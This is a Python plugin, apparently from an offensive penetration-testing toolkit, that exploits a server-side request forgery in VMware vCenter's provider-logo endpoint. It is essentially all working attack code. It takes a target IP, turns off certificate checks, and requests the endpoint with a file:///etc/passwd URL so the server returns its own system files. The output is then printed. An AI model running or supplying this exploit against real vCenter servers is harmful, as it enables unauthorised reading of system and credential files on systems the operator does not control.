import argparse
from copy import copy

import urllib3
from requests import Session

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes


class PluginVCenterProviderLog(PluginVCenterBase):
    display = "provider-log SSRF"
    alias = "prov_log"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", "--ip", help="target ip address.(192.168.1.1)", dest="address")
        parser.add_argument("-p", "--proxy", help="proxy", dest="proxy")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        urllib3.disable_warnings()
        s = Session()
        s.verify = False

        r = s.get(
            f'https://{args.address}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd',
            proxies=args.proxy)
        output.success(f"{r.status_code}\n"
                       f"{r.text}")

        return result
